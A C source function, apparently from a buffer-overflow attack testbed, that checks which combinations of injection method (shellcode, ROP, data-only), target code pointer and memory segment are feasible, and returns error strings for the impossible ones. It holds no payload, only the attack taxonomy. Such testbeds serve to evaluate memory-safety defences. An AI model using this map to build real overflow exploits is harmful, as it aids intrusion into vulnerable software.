is_attack_possible()
{
    if (((g.attack.inject_param == INJECTED_CODE_NO_NOP) ||
         (g.attack.inject_param == INJECTED_CODE_NO_NOP_JR)) &&
      (!(g.attack.function == MEMCPY) && !(g.attack.function == HOMEBREW)))
    {
        return "Error: Impossible to inject shellcode with string functions (for now)";
    }

#ifndef __GNUC__
    if (g.attack.inject_param == RETURN_INTO_ANCESTOR_ROP)
    {
        return "Error: Impossible to return into ancestor w/o GNU extensions";
    }
#endif

    if (g.attack.inject_param == DATA_ONLY) {
        if (g.attack.code_ptr != VAR_BOF &&
            g.attack.code_ptr != VAR_LEAK)
        {
            return "Error: Misused DOP code pointer parameters.";
        }

        if (g.attack.code_ptr == VAR_LEAK && g.attack.technique == INDIRECT) {
            return "Error: Impossible to do an indirect leak attack.";
        }
    } else if (g.attack.code_ptr == VAR_BOF ||
               g.attack.code_ptr == VAR_LEAK) {
        return "Error: Must use \"dataonly\" injection parameter for DOP attacks.";
    }

    // attacks targeting another memory location must be indirect
    switch (g.attack.location) {
        case STACK:
            if (g.attack.technique == DIRECT) {
                if ((g.attack.code_ptr == FUNC_PTR_HEAP) ||
                  (g.attack.code_ptr == FUNC_PTR_BSS) ||
                  (g.attack.code_ptr == FUNC_PTR_DATA) ||
                  (g.attack.code_ptr == LONGJMP_BUF_HEAP) ||
                  (g.attack.code_ptr == LONGJMP_BUF_DATA) ||
                  (g.attack.code_ptr == LONGJMP_BUF_BSS) )
                {
                    return "Error: Impossible to perform a direct attack on the stack into another memory segment.";
                }
            }
            break;

        case HEAP:
            if ((g.attack.technique == DIRECT) &&
              ((g.attack.code_ptr == RET_ADDR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (g.attack.code_ptr == FUNC_PTR_BSS) ||
              (g.attack.code_ptr == FUNC_PTR_DATA) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (g.attack.code_ptr == LONGJMP_BUF_BSS) ||
              (g.attack.code_ptr == LONGJMP_BUF_DATA) ))
            {
                return "Error: Impossible to perform a direct attack on the heap into another memory segment.";
            }
            break;

        case DATA:
            if ((g.attack.technique == DIRECT) &&
              ((g.attack.code_ptr == RET_ADDR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (g.attack.code_ptr == FUNC_PTR_BSS) ||
              (g.attack.code_ptr == FUNC_PTR_HEAP) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (g.attack.code_ptr == LONGJMP_BUF_HEAP) ||
              (g.attack.code_ptr == LONGJMP_BUF_BSS) ))
            {
                return "Error: Impossible to perform a direct attack on the data segment into another memory segment.";
            }
            break;

        case BSS:
            if ((g.attack.technique == DIRECT) &&
              ((g.attack.code_ptr == RET_ADDR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (g.attack.code_ptr == FUNC_PTR_DATA) ||
              (g.attack.code_ptr == FUNC_PTR_HEAP) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (g.attack.code_ptr == LONGJMP_BUF_HEAP) ||
              (g.attack.code_ptr == LONGJMP_BUF_DATA) ))
            {
                return "Error: Impossible to perform a direct attack on the bss into another memory segment.";
            }
            break;
    }

    return NULL;
} /* is_attack_possible */
